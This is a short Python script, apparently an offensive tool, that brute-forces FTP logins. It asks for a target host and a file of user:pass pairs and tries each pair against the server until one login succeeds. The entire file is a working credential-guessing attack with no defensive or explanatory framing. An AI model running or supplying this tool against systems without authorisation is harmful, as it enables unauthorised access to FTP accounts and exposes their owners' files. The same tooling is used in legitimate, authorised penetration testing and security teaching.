#!/usr/bin/python

import ftplib


def ftp_brute(host, pwd_file):
    try:
        file = open(pwd_file, "r")
    except:
        print("!! File not found")
    for line in file.readlines():
        line = line.strip("\n")
        user = line.split(":")[0]
        pwd = line.split(":")[1]
        print(f"<> Checking {user}/{pwd}...", end="")
        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(user, pwd)
            print("SUCCESS")
            ftp.quit()
            return
        except:
            print("no")


if __name__ == "__main__":
    host = input("! Enter IP/hostname: ")
    pwd_file = input("!  Enter user:pass file path: ")
    ftp_brute(host, pwd_file)
